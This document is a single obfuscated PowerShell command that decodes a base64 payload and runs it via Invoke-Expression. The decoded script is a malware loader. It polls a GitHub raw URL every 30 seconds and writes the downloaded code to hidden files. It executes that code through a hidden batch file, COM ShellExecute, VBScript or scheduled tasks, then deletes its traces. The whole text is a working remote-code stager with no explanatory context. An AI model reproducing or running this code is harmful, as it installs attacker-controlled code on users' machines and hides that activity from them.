$ERP="ZnVuY3Rpb24gY2YoJHApIHsNCiAgICBpZiAoISh0ZXN0LXBhdGggJHApKXsNCiAgICAgICAgbWQgJHAgfCBPdXQtTnVsbA0KICAgIH0gICANCn0NCmZ1bmN0aW9uIEV4ZWN1IHsNCiAgICBQYXJhbSAoJGNvbSwkYXJnKSAgICANCiAgICBpZiAoISgkYXJnKSkgew0KICAgICAgICAkYXJnID0gIiAiDQogICAgfQ0KICAgICRybmQgPSBHZXQtUmFuZG9tDQogICAgJHRuID0gJHJuZA0KICAgICRnZGUgPSBHZXQtRGF0ZSA7DQogICAgJGdkID0gJGdkZS5BZGRNaW51dGVzKDEpDQogICAgJGhyID0gJGdkLmhvdXIgDQogICAgJG1uID0gJGdkLk1pbnV0ZQ0KICAgIGlmICgkaHIgLWx0IDEwICkgeyRociA9ICIwJGhyIn0NCiAgICBpZiAoJG1uIC1sdCAxMCApIHskbW4gPSAiMCRtbiJ9DQogICAgJHN0ID0gIiRoci0kbW4iLlJlcGxhY2UoIi0iLCI6IikgICAgDQogICAgJHlyID0gJGdkLlllYXIgICAgOyAgICAkbSA9ICRnZC5Nb250aA0KICAgIGlmICgkbSAtZ3QgOSl7ICRtb24gPSAkbSB9IGVsc2UgeyAkbW9uID0gIjAkbSIgfSA7ICRkID0gJGdkLkRheQ0KICAgICR0aW1lID0gIiR5ci0kbW9uLSRkJVQkc3QlOjAwIi5SZXBsYWNlKCIlIiwiIikNCiAgICAkZGF0ZSA9ICIyMDI0LTAxLTAxVDE2OjIwOjAwIiA7ICRzdCA9ICR0aW1lDQogICAgJGZpbGUgPSAkY29tIDsgJGFyZ3VtZW50cyA9ICRhcmcNCiAgICAkeG1scGEgPSAiQzpcV2luZG93c1xTeXN0ZW0zMlxUYXNrc1wkdG4iDQogICAgdHJ5IHsgICR0aW0gPSAkZ2QuVG9TaG9ydFRpbWVTdHJpbmcoKQ0KICAgICAgICAkYWN0ID0gTmV3LVNjaGVkdWxlZFRhc2tBY3Rpb24gLUV4ZWN1dGUgJGZpbGUgIC1Bcmd1bWVudCAgJGFyZ3VtZW50cw0KICAgICAgICAkdHJpID0gTmV3LVNjaGVkdWxlZFRhc2tUcmlnZ2VyIC1PbmNlIC1BdCAkdGltDQogICAgICAgICRzZXQgPSBOZXctU2NoZWR1bGVkVGFza1NldHRpbmdzU2V0IC1BbGxvd1N0YXJ0SWZPbkJhdHRlcmllcyANCiAgICAgICAgUmVnaXN0ZXItU2NoZWR1bGVkVGFzayAtQWN0aW9uICRhY3QgLVRyaWdnZXIgJHRyaSAtU2V0dGluZ3MgJHNldCAgLVRhc2tOYW1lICR0biB8IE91dC1OdWxsDQogICAgfSBjYXRjaCB7ICR4bWxjID0gIjw/eG1sIHZlcnNpb249YCIxLjBgIiBlbmNvZGluZz1gIlVURi0xNmAiPz5gbjxUYXNrIHZlcnNpb249YCIxLjJgIiB4bWxucz1gImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZG93cy8yMDA0LzAyL21pdC90YXNrYCI+YG4gIDxSZWdpc3RyYXRpb25JbmZvPmBuICAgIDxEYXRlPiRkYXRlPC9EYXRlPmBuICAgIDxBdXRob3I+JGVudjpjb21wdXRlcm5hbWVcJGVudjp1c2VybmFtZTwvQXV0aG9yPmBuICAgIDxVUkk+XCRUTjwvVVJJPmBuICA8L1JlZ2lzdHJhdGlvbkluZm8+YG4gIDxUcmlnZ2Vycz5gbiAgICA8VGltZVRyaWdnZXI+YG4gICAgICA8U3RhcnRCb3VuZGFyeT4kU1Q8L1N0YXJ0Qm91bmRhcnk+YG4gICAgICA8RW5hYmxlZD50cnVlPC9FbmFibGVkPmBuICAgIDwvVGltZVRyaWdnZXI+YG4gIDwvVHJpZ2dlcnM+YG4gIDxTZXR0aW5ncz5gbiAgICA8TXVsdGlwbGVJbnN0YW5jZXNQb2xpY3k+SWdub3JlTmV3PC9NdWx0aXBsZUluc3RhbmNlc1BvbGljeT5gbiAgICA8RGlzYWxsb3dTdGFydElmT25CYXR0ZXJpZXM+ZmFsc2U8L0Rpc2FsbG93U3RhcnRJZk9uQmF0dGVyaWVzPmBuICAgIDxTdG9wSWZHb2luZ09uQmF0dGVyaWVzPmZhbHNlPC9TdG9wSWZHb2luZ09uQmF0dGVyaWVzPmBuICAgIDxBbGxvd0hhcmRUZXJtaW5hdGU+ZmFsc2U8L0FsbG93SGFyZFRlcm1pbmF0ZT5gbiAgICA8U3RhcnRXaGVuQXZhaWxhYmxlPnRydWU8L1N0YXJ0V2hlbkF2YWlsYWJsZT5gbiAgICA8UnVuT25seUlmTmV0d29ya0F2YWlsYWJsZT5mYWxzZTwvUnVuT25seUlmTmV0d29ya0F2YWlsYWJsZT5gbiAgICA8SWRsZVNldHRpbmdzPmBuICAgICAgPER1cmF0aW9uPlBUMTBNPC9EdXJhdGlvbj5gbiAgICAgIDxXYWl0VGltZW91dD5QVDFIPC9XYWl0VGltZW91dD5gbiAgICAgIDxTdG9wT25JZGxlRW5kPnRydWU8L1N0b3BPbklkbGVFbmQ+YG4gICAgICA8UmVzdGFydE9uSWRsZT5mYWxzZTwvUmVzdGFydE9uSWRsZT5gbiAgICA8L0lkbGVTZXR0aW5ncz5gbiAgICA8QWxsb3dTdGFydE9uRGVtYW5kPnRydWU8L0FsbG93U3RhcnRPbkRlbWFuZD5gbiAgICA8RW5hYmxlZD50cnVlPC9FbmFibGVkPmBuICAgIDxIaWRkZW4+dHJ1ZTwvSGlkZGVuPmBuICAgIDxSdW5Pbmx5SWZJZGxlPmZhbHNlPC9SdW5Pbmx5SWZJZGxlPmBuICAgIDxXYWtlVG9SdW4+ZmFsc2U8L1dha2VUb1J1bj5gbiAgICA8RXhlY3V0aW9uVGltZUxpbWl0PlBUNzJIPC9FeGVjdXRpb25UaW1lTGltaXQ+YG4gICAgPFByaW9yaXR5Pjc8L1ByaW9yaXR5PmBuICA8L1NldHRpbmdzPmBuICA8QWN0aW9ucyBDb250ZXh0PWAiQXV0aG9yYCI+YG4gICAgPEV4ZWM+YG4gICAgPENvbW1hbmQ+JGZpbGU8L0NvbW1hbmQ+YG4gICAgPEFyZ3VtZW50cz4kYXJndW1lbnRzPC9Bcmd1bWVudHM+YG4gICAgPC9FeGVjPmBuICA8L0FjdGlvbnM+YG4gIDxQcmluY2lwYWxzPmBuICAgIDxQcmluY2lwYWwgaWQ9YCJBdXRob3JgIj5gbiAgICAgIDxVc2VySWQ+JGVudjpjb21wdXRlcm5hbWVcJGVudjp1c2VybmFtZTwvVXNlcklkPmBuICAgICAgPExvZ29uVHlwZT5JbnRlcmFjdGl2ZVRva2VuPC9Mb2dvblR5cGU+YG4gICAgICA8UnVuTGV2ZWw+TGVhc3RQcml2aWxlZ2U8L1J1bkxldmVsPmBuICAgIDwvUHJpbmNpcGFsPmBuICA8L1ByaW5jaXBhbHM+YG48L1Rhc2s+Ig0KICAgICAgICAkeG1sYyA+ICR4bWxwYQ0KICAgICAgICB0cnkgeyBDOlxXaW5kb3dzXFN5c3RlbTMyXHNjaHRhc2tzLmV4ZSAvY3JlYXRlIC9YTUwgJHhtbHBhIC90biAkdG4gL2YgICB9IGNhdGNoIHsgQzpcV2luZG93c1xTeXN0ZW0zMlxzY2h0YXNrcy5leGUgL2NyZWF0ZSAvdG4gJHRuIC90ciAiJGZpbGUgJGFyZ3VtZW50cyIgL1NDIERBSUxZIC9TVCAkc3QgL2YgfSAgICAgICAgICAgIA0KICAgIH0gICAgDQogICAgc2xlZXAgODAgOyB0cnkgeyBVbnJlZ2lzdGVyLVNjaGVkdWxlZFRhc2sgLVRhc2tOYW1lICR0biAgLUNvbmZpcm06JGZhbHNlIH0gY2F0Y2ggeyBDOlxXaW5kb3dzXFN5c3RlbTMyXHNjaHRhc2tzLmV4ZSAvZGVsZXRlIC90biAkdG4gL2YgfQ0KfQ0KDQoNCmZ1bmN0aW9uIHJuZHN0ciB7DQogICAgcGFyYW0gKCRsZW4pDQogICAgJHN0ciA9ICIiDQogICAgZm9yICgkaSA9IDEgOyAkaSAtbGUgJGxlbiA7ICRpKyspIHsNCiAgICAgICAgJGYgPSA2NSw2Niw2Nyw2OCw2OSw3MCw3MSw3Miw3Myw3NCw3NSw3Niw3Nyw3OCw3OSw4MCw4MSw4Miw4Myw4NCw4NSw4Niw4Nyw4OCw4OSw5MCB8IEdldC1SYW5kb20NCiAgICAgICAgJGxldCA9IFtjaGFyXSRmDQogICAgICAgICRzdHIgKz0gIiRsZXQiDQogICAgfQ0KICAgIHJldHVybiAkc3RyDQp9DQogICAgDQogIA0KZnVuY3Rpb24gUEUgew0KICAgIHBhcmFtICgkcHMpDQoNCiAgICAkbGVuID0gMg0KICAgICRybmRzID0gcm5kc3RyIC1sZW4gJGxlbg0KICAgIA0KICAgICRxID0gIiINCiAgICAxLi4kbGVuIHwgJSB7ICRxICs9ICI/IiB9DQogICAgJG5maWwgPSAiJGVudjpwcm9ncmFtZGF0YVwkcm5kcyINCg0KICAgIGlmIChbU3lzdGVtLklPLkZpbGVdOjpFeGlzdHMoJHBzKSkgew0KICAgICAgICBjb3B5ICRwcyAkbmZpbCAtRm9yY2UNCiAgICAgICAgc2RlbCgkcHMpDQogICAgfSBlbHNlIHsNCg0KICAgICAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbFRleHQoJG5maWwsJHBzKQ0KICAgIH0NCg0KJHJidCA9IHJuZHN0ciAtbGVuIDUNCg0KJGJhdGYgPSAiJGVudjphcHBkYXRhXE1pY3Jvc29mdFwkcmJ0LmJhdCINCg0KJGJhdG1vYmlsID0gQCINCkBlY2hvIG9mZg0KY2QgQzpcV2luZG93c1xTeXN0ZW0zMlxXaW5kb3dzUG93ZXJzaGVsbFx2MS4wDQpzdGFydCAvaSAvbWluIHBvd2Vyc2hlbGwgLXcgMDEgLWMgc3YgInoiIGAiJGBlbnY6Pz8/Pz8/P2Q/Pz9cJHFgIjtgJGU9Z2MgYCR6O3JpIGAkejsuKFtjaGFyXTEwNStbY2hhcl0xMDErW2NoYXJdMTIwKSBgJGU7DQpjbWQgL2MgZWNobyAlcmFuZG9tJSVyYW5kb20lID4gJX5GMCAmJiBkZWwgJX5GMCAvcQ0KZXhpdA0KIkANCiAgICBbU3lzdGVtLklvLkZpbGVdOjpXcml0ZUFsbFRleHQoJGJhdGYsJGJhdG1vYmlsKQ0KDQogICAgdHJ5IHsNCg0KICAgICAgICAkaCA9IFthY3RpdmF0b3JdOjpDcmVhdGVJbnN0YW5jZShbdHlwZV06OkdldFR5cGVGcm9tQ0xTSUQoIjlCQTA1OTcyLUY2QTgtMTFDRi1BNDQyLTAwQTBDOTBBOEYzOSIpKQ0KICAgICAgICAkeiA9ICRoLkl0ZW0oKQ0KICAgICAgICAkei5Eb2N1bWVudC5BcHBsaWNhdGlvbi5TaGVsbEV4ZWN1dGUoJGJhdGYsICIiLCAiIiwgIm9wZW4iLCAwKQ0KICAgICAgICANCiAgICB9IGNhdGNoIHsNCg0KICAgICAgICAkdnMgPSAiT24gRXJyb3IgUmVzdW1lIE5leHQgOiBSYW5kb21pemUgIDogYiA9IFJvdW5kKFJuZCAqIDEwMCkgLyBSb3VuZChSbmQgKiAxMDAwMCkgOiBzZXQgcyA9IENyZWF0ZU9iamVjdChgIndzY3JpcHQuU2hlbGxgIikgOiBzLnJ1biBgIiRiYXRmYCIgLCAwIg0KICAgICAgICAkcnZzID0gcm5kc3RyIC1sZW4gNQ0KICAgICAgICAkdnNmID0gIiRlbnY6cHVibGljXCRydnMudmJzIg0KDQogICAgICAgIFtTeXN0ZW0uSW8uRmlsZV06OldyaXRlQWxsVGV4dCgkdnNmLCR2cykNCiAgICAgICAgaWYgKHRlc3QtcGF0aCAkdnNmKSB7DQogICAgICAgICAgICBFeGVjdSAtY29tICJDOlxXaW5kb3dzXFN5c3RlbTMyXHdzY3JpcHQuZXhlIiAtYXJnICR2c2YNCiAgICAgICAgICAgIHNsZWVwIDINCiAgICAgICAgICAgIHNkZWwoJHZzZikNCiAgICAgICAgfSAgICAgICAgDQogICAgfQ0KDQogICAgc2xlZXAgMw0KICAgIDwjIFNkZWwoJGJhdGYpICM+DQp9DQoNCmZ1bmN0aW9uIHNkZWwoJHBhKXsgDQogICAgJHJhbiA9IEdFdC1SYW5kb20gDQogICAgaWYoJGIuZmlsZUV4aXN0cygkcGEpKXsgDQogICAgICAgIGVjaG8gJHJhbiA+ICRwYSANCiAgICAgICAgZGVsICRwYSAtZm9yY2UgDQogICAgfSANCn0gIA0KDQoNCg0KDQpGdW5jdGlvbiBnaXQgew0KDQogICAgdHJ5IHsgIA0KICAgIHRyeSB7ICRjb24gPSAkdy5Eb3dubG9hZFN0cmluZygkcmwpIH0gY2F0Y2ggeyAkY29uID0gSXdyIC1Vc2VCYXNpY1BhcnNpbmcgIC1VcmkgJHJsIH0NCg0KICAgIGlmICghKFtzdHJpbmddOjppc251bGxvckVtcHR5KCRjb24pKSkgew0KICAgICAgICAgICAgDQogICAgICAgICRwYWsgPSAiJGVudjo/Pz8/Pz8/cD8/Pz9cTVBhY2thZ2VzIg0KICAgICAgICAkY2hxID0gIiRwYWtcSWNvbkNhY2hlIg0KICAgICAgICANCiAgICAgICAgaWYgKCEoJGIuZm9sZGVyRXhpc3RzKCRwYWspKSl7DQogICAgICAgICAgICBtZCAkcGFrIHwgT3V0LU51bGwNCiAgICAgICAgfQ0KDQogICAgICAgIGlmICh0ZXN0LXBhdGggJGNocSl7DQogICAgICAgICAgICBbaW50XSRyZWQgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsVGV4dCgkY2hxKQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHJlZCA9IDANCiAgICAgICAgfQ0KDQogICAgICAgICRsZWQgPSAkY29uLmxlbmd0aA0KDQogICAgICAgICJSRUQgJHJlZGBuTEVEICRMRUQiDQogICAgICAgIA0KICAgICAgICBpZiAoJHJlZCAtbmUgJGxlZCl7DQoNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgW1N5c3RlbS5JTy5GaWxlXTo6V3JpdGVBbGxUZXh0KCRjaHEsJGxlZCkNCiAgICANCiAgICAgICAgICAgICRybiA9IHJuZHN0ciAtbGVuIDYNCiAgICAgICAgICAgICRmaWxlc3MgPSAiJGVudjphcHBkYXRhXE1pY3Jvc29mdFwkcm4iDQogICAgICAgICAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbFRleHQoJGZpbGVzcywkY29uKQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBzbGVlcCAxDQogICAgICAgICAgICBQRSAtcHMgJGZpbGVzcw0KDQogICAgICAgIH0gDQogICAgfSBlbHNlIHsNCiAgICAgICAgc2xlZXAgMTANCiAgICB9IH1jYXRjaCB7fQ0KfQ0KDQpTTEVFUCA3DQoNCiRybCA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vUzRNUzNQL1hYWC9tYWluL0lFWEQiDQokc2ggPSBOZXctT2JqZWN0IC1Db21PYmplY3QgV3NjcmlwdC5TaGVsbCANCiR3ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudA0KJGIgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QNCiRybmQgPSBHZXQtUmFuZG9tDQokbWUgPSAkTXlJbnZvY2F0aW9uLk15Q29tbWFuZC5wYXRoDQoNCiR0aXQgPSAiUFI0VCINCiR0cCA9IDANCiRob3N0LnVpLnJhd3VpLldpbmRvd1RpdGxlID0gIiR0aXQiDQppZiAoJGhvc3QudWkucmF3dWkuV2luZG93VGl0bGUgLWVxICIkdGl0Iikgew0KICAgIEdldC1Qcm9jZXNzIC1OYW1lICJwb3dlcnNoZWxsIiB8ICUgew0KICAgICAgICAkdGwgPSAkXy5NYWluV2luZG93VGl0bGUNCiAgICAgICAgaWYgKCR0bCAtZXEgJHRpdCl7DQogICAgICAgICAgICAkdHAgKz0gMQ0KICAgICAgICB9DQogICAgfQ0KICAgIGlmICgkdHAgLWd0IDEpew0KICAgICAgICBleGl0DQogICAgfQ0KfSANCg0KdHJ5IHsgICANCiAgICBmb3IoOzspew0KICAgICAgICBnaXQgOyBzbGVlcCAzMA0KICAgIH0NCn0gY2F0Y2ggew0KICAgIHdoaWxlICgkdHJ1ZSkgew0KICAgICAgICBnaXQgOyBzbGVlcCAzMA0KICAgIH0NCn0=";$TQGIDX=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($ERP));$TQGIDX|&([char]73+[char]69+[char]120)